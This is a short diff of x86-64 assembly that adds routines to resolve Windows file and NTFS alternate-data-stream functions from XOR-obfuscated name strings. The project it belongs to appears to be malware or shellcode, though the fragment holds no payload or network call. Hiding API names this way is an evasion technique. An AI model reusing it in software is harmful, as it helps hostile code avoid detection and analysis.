@@ -1096,6 +1096,38 @@ populate_kernel_function_ptrs_by_name:
     mov [read_file], rax                        ; ReadFile addr
 
     mov rcx, [rbp + 16]
+    mov rdx, set_file_pointer_xor
+    mov r8, set_file_pointer_xor.len
+    xor r9, r9
+    call unxor_and_get_proc_addr                ; proc addr
+
+    mov [set_file_pointer], rax                 ; SetFilePointer addr
+
+    mov rcx, [rbp + 16]
+    mov rdx, find_first_stream_w_xor
+    mov r8, find_first_stream_w_xor.len
+    xor r9, r9
+    call unxor_and_get_proc_addr                ; proc addr
+
+    mov [find_first_stream_w], rax              ; FindFirstStreamW addr
+
+    mov rcx, [rbp + 16]
+    mov rdx, find_next_stream_w_xor
+    mov r8, find_next_stream_w_xor.len
+    xor r9, r9
+    call unxor_and_get_proc_addr                ; proc addr
+
+    mov [find_next_stream_w], rax               ; FindNextStreamW addr
+
+    mov rcx, [rbp + 16]
+    mov rdx, find_close_xor
+    mov r8, find_close_xor.len
+    xor r9, r9
+    call unxor_and_get_proc_addr                ; proc addr
+
+    mov [find_close], rax                       ; FindClose addr
+
+    mov rcx, [rbp + 16]
     mov rdx, write_file_xor
     mov r8, write_file_xor.len
     xor r9, r9
